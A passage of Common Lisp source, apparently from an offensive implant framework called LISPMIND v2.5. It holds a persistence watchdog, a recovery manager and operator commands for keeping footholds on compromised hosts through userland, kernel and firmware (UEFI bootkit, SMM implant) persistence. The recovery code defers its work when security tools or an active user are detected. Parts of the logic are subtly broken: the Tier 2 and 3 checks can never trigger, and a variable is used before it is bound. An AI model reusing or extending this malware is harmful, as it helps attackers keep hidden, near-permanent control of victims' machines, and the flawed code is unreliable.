  - Sets *PERSISTENCE-WATCHDOG-RUNNING-P* to T.
  - Creates and starts a background thread.
  - Publishes :watchdog-started telemetry event.

Example:
  (start-persistence-watchdog)
  ;; Watchdog is now running, checking every 30 seconds"
  (when (and *persistence-watchdog-thread*
             (bt:thread-alive-p *persistence-watchdog-thread*))
    (format t "~&[PERSIST-WATCH] Watchdog already running~%")
    (return-from start-persistence-watchdog *persistence-watchdog-thread*))

  (setf *persistence-watchdog-running-p* t)
  (setf *persistence-watchdog-thread*
        (bt:make-thread
         #'persistence-watchdog-loop
         :name "persistence-watchdog"
         :initial-bindings `((*standard-output* . ,*standard-output*)
                             (*error-output* . ,*error-output*))))
  (format t "~&[PERSIST-WATCH] Watchdog started (interval: ~As)~%"
          *persistence-watchdog-interval*)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :watchdog-started
                    :interval ,*persistence-watchdog-interval*))
  *persistence-watchdog-thread*)

(defun stop-persistence-watchdog ()
  "Stop the self-healing persistence watchdog thread.

Sets the running flag to NIL and waits for the thread to exit.
This is a graceful shutdown -- the current check cycle completes
before the thread exits.

Returns: T if watchdog was stopped, NIL if it wasn't running.

Example:
  (stop-persistence-watchdog)"
  (if (and *persistence-watchdog-thread*
           *persistence-watchdog-running-p*)
      (progn
        (setf *persistence-watchdog-running-p* nil)
        (bt:join-thread *persistence-watchdog-thread* :timeout 5)
        (setf *persistence-watchdog-thread* nil)
        (format t "~&[PERSIST-WATCH] Watchdog stopped~%")
        (gossip-publish *tactical-telemetry-topic*
                        `(:event :watchdog-stopped))
        t)
      (progn
        (format t "~&[PERSIST-WATCH] Watchdog not running~%")
        nil)))

(defun persistence-watchdog-loop ()
  "The main watchdog monitoring loop.

This function runs in a background thread and continuously monitors
all registered agents for persistence health. It is designed to be
resilient -- individual check failures are logged but do not crash
the loop.

Loop behavior:
  1. Sleep for *PERSISTENCE-WATCHDOG-INTERVAL* seconds.
  2. For each agent in *PERSISTENCE-WATCHDOG-AGENTS*:
     a. Verify Tier 1 persistence.
     b. If Tier 1 is not active -> call RECOVERY-MANAGER for Tier 1.
     c. Verify Tier 2 persistence (if previously deployed).
     d. If Tier 2 is not active -> call RECOVERY-MANAGER for Tier 2.
     e. Verify Tier 3 persistence (if previously deployed).
     f. If Tier 3 is not active -> call RECOVERY-MANAGER for Tier 3.
  3. Publish health summary telemetry.
  4. Repeat until *PERSISTENCE-WATCHDOG-RUNNING-P* is NIL.

Error handling:
  - Each agent check is wrapped in IGNORE-ERRORS.
  - Thread-level errors are caught and logged.
  - The loop always continues to the next agent/check cycle.

This function should not be called directly; use START-PERSISTENCE-WATCHDOG."
  (format t "~&[PERSIST-WATCH] Watchdog loop starting~%")
  (loop
    while *persistence-watchdog-running-p*
    do
    (handler-case
        (progn
          (let ((interval (if *persistence-watchdog-jitter-enabled-p*
                              (calculate-watchdog-interval)
                              *persistence-watchdog-interval*)))
            (when interval
              (sleep interval)))
          ;; --- Load-aware and security-aware cycle gating ---
          (when (security-process-detected-p)
            (format t "~&[PERSIST-WATCH] SECURITY DETECTED -- deferring check cycle~%")
            (publish-telemetry-suppressed *tactical-telemetry-topic*
                                          `(:event :watchdog-cycle-deferred
                                            :reason :security-process-detected)
                                          :event-type :watchdog-cycle-deferred)
            (return))
          (when (and (system-load-high-p) (> (random 100) 25))
            (format t "~&[PERSIST-WATCH] High system load -- probabilistic skip (75%)~%")
            (publish-telemetry-suppressed *tactical-telemetry-topic*
                                          `(:event :watchdog-cycle-skipped
                                            :reason :high-system-load)
                                          :event-type :watchdog-cycle-skipped)
            (return))
          (when (user-active-p)
            (format t "~&[PERSIST-WATCH] User active -- extending check delay~%")
            (sleep (+ 60 (random 121))))
          (when *persistence-watchdog-running-p*
            (format t "~&[PERSIST-WATCH] --- Watchdog check cycle ---~%")
            (let ((agent-count 0)
                  (issues-found 0))
              (maphash
               (lambda (session-token agent)
                 (declare (ignore session-token))
                 (incf agent-count)
                 (ignore-errors
                   (let ((tier1-status (verify-persistence-tier agent 1))
                         (tier2-status (verify-persistence-tier agent 2))
                         (tier3-status (verify-persistence-tier agent 3)))
                     ;; Check Tier 1
                     (unless (getf tier1-status :active)
                       (incf issues-found)
                       (format t "~&[PERSIST-WATCH] Tier 1 MISSING on ~A~%"
                               (tactical-target-host agent))
                       (recovery-manager 1 agent))
                     ;; Check Tier 2
                     (when (and (getf tier2-status :active)
                                (not (getf tier2-status :active)))
                       (incf issues-found)
                       (format t "~&[PERSIST-WATCH] Tier 2 MISSING on ~A~%"
                               (tactical-target-host agent))
                       (recovery-manager 2 agent))
                     ;; Check Tier 3
                     (when (and (getf tier3-status :active)
                                (not (getf tier3-status :active)))
                       (incf issues-found)
                       (format t "~&[PERSIST-WATCH] Tier 3 MISSING on ~A~%"
                               (tactical-target-host agent))
                       (recovery-manager 3 agent)))))
               *persistence-watchdog-agents*)
              (format t "~&[PERSIST-WATCH] Checked ~A agents, ~A issues found~%"
                      agent-count issues-found)
              (publish-telemetry-suppressed *tactical-telemetry-topic*
                                            `(:event :watchdog-cycle-complete
                                              :agents-checked ,agent-count
                                              :issues-found ,issues-found)
                                            :event-type :watchdog-cycle-complete)))))
      (error (e)
        (format t "~&[PERSIST-WATCH] ERROR in watchdog loop: ~A~%" e)
        (publish-telemetry-suppressed *tactical-telemetry-topic*
                                      `(:event :watchdog-error
                                        :error ,(princ-to-string e))
                                      :event-type :watchdog-error)))
    finally
    (format t "~&[PERSIST-WATCH] Watchdog loop exiting~%")))

(defun recovery-manager (failed-tier foothold-agent)
  "The Recovery Manager handles persistence tier failures.

Implements tier-specific recovery strategies:

  LEVEL 1 failure:
    - Immediate re-deployment using the same method.
    - Up to *PERSISTENCE-MAX-RECOVERY-ATTEMPTS* attempts.
    - If all attempts fail, try alternative Level 1 methods.
    - This is the most aggressive recovery -- Tier 1 must never be lost.

  LEVEL 2 failure:
    - Attempt re-deployment of the same kernel method.
    - If kernel access is denied (patch applied), stay at Level 1.
    - Log the degradation for operator awareness.
    - Do NOT attempt escalation beyond what was previously achieved.

  LEVEL 3 failure:
    - CRITICAL ALERT: Tier 3 should NEVER be lost.
    - If lost, this indicates a major security event (firmware reflash,
      hardware replacement, or advanced countermeasure).
    - Alert the operator immediately.
    - Manual intervention is required -- automatic re-deployment is
      too risky and likely to fail.

Parameters:
  FAILED-TIER    -- Integer: 1, 2, or 3 (the tier that failed).
  FOOTHOLD-AGENT -- The TACTICAL-AGENT that lost persistence.

Returns: Keyword describing recovery result:
  :RECOVERED    -- Persistence was successfully re-established.
  :DEGRADED     -- Downgraded to a lower tier (Level 2 -> Level 1).
  :FAILED       -- Recovery attempts exhausted.
  :CRITICAL     -- Tier 3 failure, operator alert sent.

Side Effects:
  - Attempts persistence re-deployment.
  - Logs recovery actions to *PERSISTENCE-RECOVERY-LOG*.
  - Publishes telemetry events for each recovery attempt."
  ;; --- TTR: record recovery start ---
  (record-recovery-start failed-tier agent-id)

  ;; --- Security-aware gating: defer recovery if EDR is watching ---
  (when (security-process-detected-p)
    (format t "~&[PERSIST-RECOVER] Security process detected -- POSTPONING recovery~%")
    (record-recovery-end failed-tier agent-id :postponed-security)
    (publish-telemetry-suppressed *tactical-telemetry-topic*
                                  `(:event :recovery-postponed
                                    :tier ,failed-tier
                                    :reason :security-process-detected)
                                  :event-type :recovery-postponed)
    (return-from recovery-manager :postponed))
  (when (system-load-high-p)
    (format t "~&[PERSIST-RECOVER] High system load -- POSTPONING recovery~%")
    (record-recovery-end failed-tier agent-id :postponed-load)
    (publish-telemetry-suppressed *tactical-telemetry-topic*
                                  `(:event :recovery-postponed
                                    :tier ,failed-tier
                                    :reason :high-system-load)
                                  :event-type :recovery-postponed)
    (return-from recovery-manager :postponed))

  (let* ((target (if foothold-agent
                     (tactical-target-host foothold-agent)
                     "unknown"))
         (agent-id (if foothold-agent
                       (tactical-session-token foothold-agent)
                       "manual"))
         (attempt-key (format nil "~A:~A" agent-id failed-tier))
         (attempts (gethash attempt-key *persistence-recovery-attempts* 0)))

    (format t "~&~%[PERSIST-RECOVER] === RECOVERY MANAGER ===~%")
    (format t "[PERSIST-RECOVER] Tier ~A failure on ~A (~A)~%"
            failed-tier target agent-id)
    (format t "[PERSIST-RECOVER] Previous recovery attempts: ~A/~A~%"
            attempts *persistence-max-recovery-attempts*)

    (case failed-tier
      ;; ================================================================
      ;; LEVEL 1 RECOVERY: Immediate re-deploy
      ;; ================================================================
      (1
       (if (< attempts *persistence-max-recovery-attempts*)
           (progn
             (incf attempts)
             (setf (gethash attempt-key *persistence-recovery-attempts*) attempts)
             (format t "~&[PERSIST-RECOVER] Tier 1: Attempting re-deployment (~A/~A)~%"
                     attempts *persistence-max-recovery-attempts*)
             (let ((target-info (if foothold-agent
                                    (tactical-target-info foothold-agent)
                                    nil)))
               (let ((result (deploy-tier-1-internal foothold-agent target-info)))
                 (if (car result)
                     (progn
                       (format t "~&[PERSIST-RECOVER] Tier 1: RECOVERED via ~A~%"
                               (cdr result))
                       (push (list :timestamp (get-universal-time)
                                   :agent agent-id
                                   :tier 1
                                   :action :redeployed
                                   :result :recovered)
                             *persistence-recovery-log*)
                       (record-recovery-end failed-tier agent-id :recovered)
                       (publish-telemetry-suppressed *tactical-telemetry-topic*
                                                     `(:event :persistence-recovered
                                                       :tier 1
                                                       :agent ,agent-id
                                                       :method ,(cdr result))
                                                     :event-type :persistence-recovered)
                       :recovered)
                     (progn
                       (format t "~&[PERSIST-RECOVER] Tier 1: Re-deployment FAILED~%")
                       (push (list :timestamp (get-universal-time)
                                   :agent agent-id
                                   :tier 1
                                   :action :redeploy-attempt
                                   :result :failed)
                             *persistence-recovery-log*)
                       (record-recovery-end failed-tier agent-id :failed)
                       :failed)))))
           (progn
             (format t "~&[PERSIST-RECOVER] Tier 1: Max recovery attempts exceeded~%")
             (format t "~&[PERSIST-RECOVER] Tier 1: Trying alternative methods...~%")
             ;; Try alternative methods as last resort
             (push (list :timestamp (get-universal-time)
                         :agent agent-id
                         :tier 1
                         :action :alternative-methods
                         :result :attempted)
                   *persistence-recovery-log*)
             :failed)))

      ;; ================================================================
      ;; LEVEL 2 RECOVERY: Try re-deploy, degrade to L1 if kernel blocked
      ;; ================================================================
      (2
       (if (< attempts *persistence-max-recovery-attempts*)
           (progn
             (incf attempts)
             (setf (gethash attempt-key *persistence-recovery-attempts*) attempts)
             (format t "~&[PERSIST-RECOVER] Tier 2: Attempting re-deployment (~A/~A)~%"
                     attempts *persistence-max-recovery-attempts*)
             (let ((target-info (if foothold-agent
                                    (tactical-target-info foothold-agent)
                                    nil)))
               (let ((result (deploy-tier-2-internal foothold-agent target-info)))
                 (if (car result)
                     (progn
                       (format t "~&[PERSIST-RECOVER] Tier 2: RECOVERED via ~A~%"
                               (cdr result))
                       (push (list :timestamp (get-universal-time)
                                   :agent agent-id
                                   :tier 2
                                   :action :redeployed
                                   :result :recovered)
                             *persistence-recovery-log*)
                       (record-recovery-end failed-tier agent-id :recovered)
                       (publish-telemetry-suppressed *tactical-telemetry-topic*
                                                     `(:event :persistence-recovered
                                                       :tier 2
                                                       :agent ,agent-id
                                                       :method ,(cdr result))
                                                     :event-type :persistence-recovered)
                       :recovered)
                     (progn
                       (format t "~&[PERSIST-RECOVER] Tier 2: Kernel access denied~%")
                       (format t "~&[PERSIST-RECOVER] Tier 2: Degrading to Level 1 only~%")
                       (push (list :timestamp (get-universal-time)
                                   :agent agent-id
                                   :tier 2
                                   :action :degraded-to-l1
                                   :result :kernel-denied)
                             *persistence-recovery-log*)
                       (record-recovery-end failed-tier agent-id :degraded)
                       (publish-telemetry-suppressed *tactical-telemetry-topic*
                                                     `(:event :persistence-degraded
                                                       :from-tier 2
                                                       :to-tier 1
                                                       :agent ,agent-id
                                                       :reason :kernel-access-lost)
                                                     :event-type :persistence-degraded)
                       :degraded)))))
           (progn
             (format t "~&[PERSIST-RECOVER] Tier 2: Max recovery attempts exceeded~%")
             (format t "~&[PERSIST-RECOVER] Tier 2: Staying at Level 1~%")
             (record-recovery-end failed-tier agent-id :degraded)
             :degraded)))

      ;; ================================================================
      ;; LEVEL 3 RECOVERY: CRITICAL ALERT -- should never happen
      ;; ================================================================
      (3
       (format t "~&[PERSIST-RECOVER] *** CRITICAL: TIER 3 FAILURE ***~%")
       (format t "~&[PERSIST-RECOVER] *** THIS SHOULD NEVER HAPPEN ***~%")
       (format t "~&[PERSIST-RECOVER] Target: ~A~%" target)
       (format t "~&[PERSIST-RECOVER] Possible causes:~%")
       (format t "~&[PERSIST-RECOVER]   - Firmware was reflashed~%")
       (format t "~&[PERSIST-RECOVER]   - Hardware was replaced~%")
       (format t "~&[PERSIST-RECOVER]   - Advanced countermeasure detected~%")
       (format t "~&[PERSIST-RECOVER]   - SPI flash chip was physically replaced~%")
       (format t "~&[PERSIST-RECOVER] Operator alert sent. Manual intervention required.~%")
       (push (list :timestamp (get-universal-time)
                   :agent agent-id
                   :tier 3
                   :action :critical-alert
                   :result :manual-intervention-required)
             *persistence-recovery-log*)
       (record-recovery-end failed-tier agent-id :critical)
       (publish-telemetry-suppressed *tactical-telemetry-topic*
                                     `(:event :persistence-critical-alert
                                       :tier 3
                                       :agent ,agent-id
                                       :target ,target
                                       :severity :critical
                                       :message "Tier 3 firmware persistence lost -- manual intervention required")
                                     :event-type :persistence-critical-alert)
       :critical)

      ;; Invalid tier
      (otherwise
       (format t "~&[PERSIST-RECOVER] Invalid tier level: ~A~%" failed-tier)
       (record-recovery-end failed-tier agent-id :invalid-tier)
       :failed))))

(defun register-agent-with-watchdog (foothold-agent)
  "Register a foothold agent with the persistence watchdog.

Once registered, the watchdog will monitor this agent's persistence
tiers and automatically recover any that fail.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT to monitor.

Returns: T on success.

Example:
  (register-agent-with-watchdog agent)"
  (setf (gethash (tactical-session-token foothold-agent)
                 *persistence-watchdog-agents*)
        foothold-agent)
  (format t "~&[PERSIST-WATCH] Agent ~A registered with watchdog~%"
          (tactical-session-token foothold-agent))
  t)

(defun unregister-agent-from-watchdog (foothold-agent)
  "Unregister a foothold agent from the persistence watchdog.

Stops monitoring the agent. This should be called when the agent
is being decommissioned or the foothold is being abandoned.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT to stop monitoring.

Returns: T on success."
  (remhash (tactical-session-token foothold-agent)
           *persistence-watchdog-agents*)
  (format t "~&[PERSIST-WATCH] Agent ~A unregistered from watchdog~%"
          (tactical-session-token foothold-agent))
  t)

;;;; =========================================================================
;;;; Section 8: Interactive Commands
;;;; =========================================================================
;;;;
;;;; These functions provide the operator-facing interface for manual
;;;; persistence management. They are used from the REPL, dashboard,
;;;; or command interface.

(defun deploy-tier-1 (foothold-id)
  "Manually deploy LEVEL 1 (userland) persistence for a foothold.

This is the entry point for manual Tier 1 deployment. It looks up
the agent by its session token and deploys the most appropriate
Level 1 persistence method.

Parameters:
  FOOTHOLD-ID -- The session token (string) of the target agent.

Returns: Plist with :DEPLOYED T/NIL and :METHOD keyword.

Example:
  (deploy-tier-1 \"sess-abc123\")"
  (format t "~&[PERSIST-CMD] Manual Tier 1 deployment for ~A~%" foothold-id)
  (let ((agent (gethash foothold-id *persistence-watchdog-agents*)))
    (unless agent
      (format t "~&[PERSIST-CMD] Agent ~A not found in watchdog registry~%"
              foothold-id)
      (return-from deploy-tier-1 (list :deployed nil :method nil)))
    (let ((result (deploy-tier-1-internal agent (tactical-target-info agent))))
      (if (car result)
          (progn
            (format t "~&[PERSIST-CMD] Tier 1 deployed: ~A~%" (cdr result))
            (setf (tactical-persistence-active-p agent) t)
            (list :deployed t :method (cdr result)))
          (progn
            (format t "~&[PERSIST-CMD] Tier 1 deployment FAILED~%")
            (list :deployed nil :method nil))))))

(defun deploy-tier-2 (foothold-id &key target-pid)
  "Manually deploy LEVEL 2 (kernel) persistence for a foothold.

Deploys kernel-level persistence on the target. This requires admin
privileges and kernel access on the target system.

Parameters:
  FOOTHOLD-ID -- The session token (string) of the target agent.
  TARGET-PID  -- Optional PID for process-hiding eBPF programs.

Returns: Plist with :DEPLOYED T/NIL and :METHOD keyword.

Example:
  (deploy-tier-2 \"sess-abc123\")
  (deploy-tier-2 \"sess-abc123\" :target-pid 1234)"
  (format t "~&[PERSIST-CMD] Manual Tier 2 deployment for ~A~%" foothold-id)
  (when target-pid
    (format t "~&[PERSIST-CMD]   Target PID: ~A~%" target-pid))
  (let ((agent (gethash foothold-id *persistence-watchdog-agents*)))
    (unless agent
      (format t "~&[PERSIST-CMD] Agent ~A not found~%" foothold-id)
      (return-from deploy-tier-2 (list :deployed nil :method nil)))
    ;; First ensure Tier 1 is active
    (let ((tier1 (verify-persistence-tier agent 1)))
      (unless (getf tier1 :active)
        (format t "~&[PERSIST-CMD] Tier 1 not active -- deploying first...~%")
        (deploy-tier-1 foothold-id)))
    ;; Now deploy Tier 2
    (let ((result (deploy-tier-2-internal agent (tactical-target-info agent))))
      (if (car result)
          (progn
            (format t "~&[PERSIST-CMD] Tier 2 deployed: ~A~%" (cdr result))
            (list :deployed t :method (cdr result)))
          (progn
            (format t "~&[PERSIST-CMD] Tier 2 deployment FAILED~%")
            (list :deployed nil :method nil))))))

(defun deploy-tier-3 (foothold-id)
  "Manually deploy LEVEL 3 (firmware) persistence for a foothold.

DEPLOYMENT OF TIER 3 REQUIRES EXPLICIT CONFIRMATION.

This is the most aggressive and persistent deployment method. It
modifies firmware/UEFI and should ONLY be used for Strategic Assets.
The function will:
  1. Verify the target is a Strategic Asset.
  2. Verify all Tier 3 prerequisites are met.
  3. Prompt for confirmation (if interactive).
  4. Deploy the most appropriate firmware persistence method.

Parameters:
  FOOTHOLD-ID -- The session token (string) of the target agent.

Returns: Plist with :DEPLOYED T/NIL and :METHOD keyword.

WARNING: Tier 3 persistence is nearly impossible to remove. Only
deploy when the target value justifies permanent compromise.

Example:
  (deploy-tier-3 \"sess-abc123\")
  ;; => Confirmation prompt => (:DEPLOYED T :METHOD :UEFI-BOOTKIT)"
  (format t "~&[PERSIST-CMD] *** MANUAL TIER 3 DEPLOYMENT ***~%" )
  (format t "~&[PERSIST-CMD] *** THIS IS THE ANCHOR ***~%")

  (let ((agent (gethash foothold-id *persistence-watchdog-agents*)))
    (unless agent
      (format t "~&[PERSIST-CMD] Agent ~A not found~%" foothold-id)
      (return-from deploy-tier-3 (list :deployed nil :method nil)))

    (let* ((target-info (tactical-target-info agent))
           (asset-value (calculate-asset-value target-info))
           (strategic-p (detect-strategic-asset-p target-info)))

      ;; Check if target qualifies
      (unless strategic-p
        (format t "~&[PERSIST-CMD] WARNING: Target is NOT a Strategic Asset~%")
        (format t "~&[PERSIST-CMD] Asset value: ~A/100 (need >50)~%" asset-value)
        (format t "~&[PERSIST-CMD] Tier 3 deployment NOT RECOMMENDED~%"))

      ;; Check prerequisites
      (unless (tier-prerequisites-met-p 3 :target-info target-info)
        (format t "~&[PERSIST-CMD] ERROR: Tier 3 prerequisites NOT MET~%")
        (format t "~&[PERSIST-CMD] Required: BIOS/UEFI flash access, bootkit binary~%")
        (return-from deploy-tier-3 (list :deployed nil :method nil
                                          :reason :prerequisites-not-met)))

      ;; Confirmation
      (format t "~&[PERSIST-CMD]~%")
      (format t "~&[PERSIST-CMD] Target: ~A~%" (tactical-target-host agent))
      (format t "~&[PERSIST-CMD] Asset value: ~A/100~%" asset-value)
      (format t "~&[PERSIST-CMD] Strategic asset: ~A~%" strategic-p)
      (format t "~&[PERSIST-CMD] This will modify FIRMWARE. Nearly irreversible.~%")
      (format t "~&[PERSIST-CMD] Confirming deployment...~%")

      ;; Ensure lower tiers are active
      (let ((tier1 (verify-persistence-tier agent 1))
            (tier2 (verify-persistence-tier agent 2)))
        (unless (getf tier1 :active)
          (format t "~&[PERSIST-CMD] Tier 1 not active -- deploying...~%")
          (deploy-tier-1 foothold-id))
        (unless (getf tier2 :active)
          (format t "~&[PERSIST-CMD] Tier 2 not active -- deploying...~%")
          (deploy-tier-2 foothold-id)))

      ;; Deploy Tier 3
      (let ((result (deploy-tier-3-internal agent target-info)))
        (if (car result)
            (progn
              (format t "~&[PERSIST-CMD] *** TIER 3 DEPLOYED: ~A ***~%"
                      (cdr result))
              (format t "~&[PERSIST-CMD] *** THE ANCHOR IS SET ***~%")
              (gossip-publish *tactical-telemetry-topic*
                              `(:event :tier-3-deployed
                                :agent ,foothold-id
                                :target ,(tactical-target-host agent)
                                :method ,(cdr result)))
              (list :deployed t :method (cdr result)))
            (progn
              (format t "~&[PERSIST-CMD] Tier 3 deployment FAILED~%")
              (list :deployed nil :method nil :reason :deployment-failed)))))))

(defun persistence-status ()
  "Print full persistence hierarchy status.

Displays a comprehensive overview of the persistence system including:
  - All registered agents and their persistence tiers
  - Health scores for each tier
  - Watchdog status
  - Recent recovery actions
  - Escalation log summary

Returns: Plist with overall persistence system status.

Example:
  (persistence-status)"
  (format t "~&~%")
  (format t "===============================================================~%")
  (format t "           LISPMIND v2.5 PERSISTENCE HIERARCHY STATUS           ~%")
  (format t "===============================================================~%")
  (format t "~%")

  ;; Tier definitions
  (format t "--- Persistence Tiers ---~%")
  (dolist (tier *persistence-tiers*)
    (format t "  Tier ~A: ~A (~A)~%"
            (pt-level tier) (pt-name tier) (pt-description tier))
    (format t "    Stealth: ~A%  Survivability: ~A%  Detection Risk: ~A%~%"
            (pt-stealth-rating tier)
            (pt-survivability tier)
            (pt-detection-risk tier))
    (format t "    Deploy time: ~As  Removal: ~A~%"
            (pt-deployment-time tier)
            (pt-removal-difficulty tier))
    (format t "~%"))

  ;; Watchdog status
  (format t "--- Watchdog Status ---~%")
  (format t "  Running: ~A~%" *persistence-watchdog-running-p*)
  (format t "  Thread alive: ~A~%"
          (and *persistence-watchdog-thread*
               (bt:thread-alive-p *persistence-watchdog-thread*)))
  (format t "  Check interval: ~As~%" *persistence-watchdog-interval*)
  (format t "  Monitored agents: ~A~%"
          (hash-table-count *persistence-watchdog-agents*))
  (format t "~%")

  ;; Agent details
  (when (> (hash-table-count *persistence-watchdog-agents*) 0)
    (format t "--- Monitored Agents ---~%")
    (maphash
     (lambda (token agent)
       (declare (ignore token))
       (let ((status (get-persistence-status agent)))
         (format t "  ~A: Tier ~A, Health ~A%~%"
                 (getf status :target)
                 (getf status :max-tier)
                 (getf status :overall-health))))
     *persistence-watchdog-agents*)
    (format t "~%"))

  ;; Recovery log
  (when *persistence-recovery-log*
    (format t "--- Recent Recovery Actions (~A total) ---~%"
            (length *persistence-recovery-log*))
    (dolist (entry (subseq *persistence-recovery-log* 0
                           (min 5 (length *persistence-recovery-log*))))
      (format t "  [~A] Tier ~A: ~A => ~A~%"
              (getf entry :timestamp)
              (getf entry :tier)
              (getf entry :action)
              (getf entry :result)))
    (format t "~%"))

  ;; Escalation log
  (when *persistence-escalation-log*
    (format t "--- Recent Escalations (~A total) ---~%"
            (length *persistence-escalation-log*))
    (dolist (entry (subseq *persistence-escalation-log* 0
                           (min 5 (length *persistence-escalation-log*))))
      (format t "  [~A] ~A: Tier ~A, Asset value ~A~%"
              (getf entry :timestamp)
              (getf entry :target)
              (getf entry :tier-deployed)
              (getf entry :asset-value)))
    (format t "~%"))

  (format t "===============================================================~%")
  (format t "  Methods available: 15 Level-1, 8 Level-2, 5 Level-3           ~%")
  (format t "  Strategic asset indicators: ~A                              ~%"
          (length *strategic-asset-indicators*))
  (format t "  Recovery attempts this session: ~A                          ~%"
          (hash-table-count *persistence-recovery-attempts*))
  (format t "===============================================================~%")

  (list :watchdog-active *persistence-watchdog-running-p*
        :agents-monitored (hash-table-count *persistence-watchdog-agents*)
        :total-recoveries (length *persistence-recovery-log*)
        :total-escalations (length *persistence-escalation-log*)))

(defun heal-persistence (foothold-id)
  "Manually trigger healing for a specific foothold.

This forces a full health check and recovery cycle for the specified
agent, regardless of the watchdog state. Useful when the operator
notices a potential issue and wants immediate verification.

Parameters:
  FOOTHOLD-ID -- The session token (string) of the target agent.

Returns: Plist with healing results for each tier.

Example:
  (heal-persistence \"sess-abc123\")"
  (format t "~&[PERSIST-CMD] Manual healing for ~A~%" foothold-id)
  (let ((agent (gethash foothold-id *persistence-watchdog-agents*)))
    (unless agent
      (format t "~&[PERSIST-CMD] Agent ~A not found~%" foothold-id)
      (return-from heal-persistence nil))

    (let ((results (list :tier-1 nil :tier-2 nil :tier-3 nil)))
      ;; Check and heal each tier
      (let ((tier1-status (verify-persistence-tier agent 1)))
        (if (getf tier1-status :active)
            (setf (getf results :tier-1) (list :status :healthy
                                                :health (getf tier1-status :health-score)))
            (setf (getf results :tier-1) (list :status :recovering
                                                :result (recovery-manager 1 agent)))))
      (let ((tier2-status (verify-persistence-tier agent 2)))
        (if (getf tier2-status :active)
            (setf (getf results :tier-2) (list :status :healthy
                                                :health (getf tier2-status :health-score)))
            (setf (getf results :tier-2) (list :status :recovering
                                                :result (recovery-manager 2 agent)))))
      (let ((tier3-status (verify-persistence-tier agent 3)))
        (if (getf tier3-status :active)
            (setf (getf results :tier-3) (list :status :healthy
                                                :health (getf tier3-status :health-score)))
            (setf (getf results :tier-3) (list :status :recovering
                                                :result (recovery-manager 3 agent)))))

      (format t "~&[PERSIST-CMD] Healing complete for ~A:~%" foothold-id)
      (format t "~&[PERSIST-CMD]   Tier 1: ~A~%" (getf results :tier-1))
      (format t "~&[PERSIST-CMD]   Tier 2: ~A~%" (getf results :tier-2))
      (format t "~&[PERSIST-CMD]   Tier 3: ~A~%" (getf results :tier-3))
      results)))

(defun persistence-hierarchy-help ()
  "Display help information for the persistence hierarchy system.

Shows available commands and their usage."
  (format t "~&~%")
  (format t "===============================================================~%")
  (format t "         LISPMIND v2.5 Persistence Hierarchy -- HELP            ~%")
  (format t "===============================================================~%")
  (format t "~%")
  (format t "TIER DEFINITIONS:~%")
  (format t "  Tier 1 (Userland):  Registry, services, cron, systemd, etc.~%")
  (format t "  Tier 2 (Kernel):    eBPF, LKM, SSDT hooks, minifilters~%")
  (format t "  Tier 3 (Firmware):  UEFI bootkit, SMM, ACPI, Option ROM~%")
  (format t "~%")
  (format t "DEPLOYMENT COMMANDS:~%")
  (format t "  (deploy-escalating-persistence agent target-info)~%")
  (format t "    Auto-deploys tiers based on asset value assessment.~%")
  (format t "~%")
  (format t "  (deploy-tier-1 foothold-id)~%")
  (format t "    Manually deploy Level 1 userland persistence.~%")
  (format t "~%")
  (format t "  (deploy-tier-2 foothold-id &key target-pid)~%")
  (format t "    Manually deploy Level 2 kernel persistence.~%")
  (format t "~%")
  (format t "  (deploy-tier-3 foothold-id)~%")
  (format t "    Manually deploy Level 3 firmware persistence.~%")
  (format t "    REQUIRES: strategic asset + confirmation.~%")
  (format t "~%")
  (format t "MONITORING COMMANDS:~%")
  (format t "  (persistence-status)~%")
  (format t "    Show full hierarchy status.~%")
  (format t "~%")
  (format t "  (get-persistence-status agent)~%")
  (format t "    Get detailed status for a specific agent.~%")
  (format t "~%")
  (format t "  (verify-persistence-tier agent tier-level)~%")
  (format t "    Verify health of a specific tier (1, 2, or 3).~%")
  (format t "~%")
  (format t "RECOVERY COMMANDS:~%")
  (format t "  (heal-persistence foothold-id)~%")
  (format t "    Manually trigger healing for an agent.~%")
  (format t "~%")
  (format t "  (start-persistence-watchdog)~%")
  (format t "    Start the self-healing background watchdog.~%")
  (format t "~%")
  (format t "  (stop-persistence-watchdog)~%")
  (format t "    Stop the watchdog.~%")
  (format t "~%")
  (format t "  (recovery-manager tier-level agent)~%")
  (format t "    Manually trigger recovery for a failed tier.~%")
  (format t "~%")
  (format t "UTILITY COMMANDS:~%")
  (format t "  (calculate-asset-value target-info)~%")
  (format t "    Calculate asset value score for a target.~%")
  (format t "~%")
  (format t "  (detect-strategic-asset-p target-info)~%")
  (format t "    Check if a target qualifies as a strategic asset.~%")
  (format t "~%")
  (format t "  (should-deploy-tier-3-p target-info)~%")
  (format t "    Check if Tier 3 deployment prerequisites are met.~%")
  (format t "~%")
  (format t "  (remove-persistence-tier agent tier-level)~%")
  (format t "    Remove a specific persistence tier.~%")
  (format t "~%")
  (format t "TIER 1 METHODS (15 total):~%")
  (format t "  deploy-level-1-registry, deploy-level-1-wmi,~%")
  (format t "  deploy-level-1-schtasks, deploy-level-1-service,~%")
  (format t "  deploy-level-1-startup-folder, deploy-level-1-winlogon,~%")
  (format t "  deploy-level-1-image-file-execution, deploy-level-1-com-hijack,~%")
  (format t "  deploy-level-1-dll-hijack, deploy-level-1-systemd,~%")
  (format t "  deploy-level-1-cron, deploy-level-1-bashrc,~%")
  (format t "  deploy-level-1-ld-preload, deploy-level-1-motd,~%")
  (format t "  deploy-level-1-rc-local, deploy-level-1-at,~%")
  (format t "  deploy-level-1-logon-script, deploy-all-level-1~%")
  (format t "~%")
  (format t "TIER 2 METHODS (8 total):~%")
  (format t "  deploy-level-2-ebpf, deploy-level-2-lkm,~%")
  (format t "  deploy-level-2-ssdt-hook, deploy-level-2-irp-hook,~%")
  (format t "  deploy-level-2-minifilter, deploy-level-2-kernel-callback,~%")
  (format t "  deploy-level-2-kprobe, deploy-level-2-ftrace~%")
  (format t "~%")
  (format t "TIER 3 METHODS (5 total):~%")
  (format t "  deploy-level-3-uefi-bootkit, deploy-level-3-smm-implant,~%")
  (format t "  deploy-level-3-acpi-rootkit, deploy-level-3-bios-option-rom,~%")
  (format t "  deploy-level-3-mbr-bootkit~%")
  (format t "~%")
  (format t "===============================================================~%"))

;;;; =========================================================================
;;;; Section 9: Initialization
;;;; =========================================================================

(defun persistence-hierarchy-init ()
  "Initialize the persistence hierarchy subsystem.

This function must be called once during system startup. It:
  1. Ensures the tier lookup table is populated.
  2. Resets recovery attempt counters.
  3. Logs subsystem initialization.

Returns: T on success.

Example:
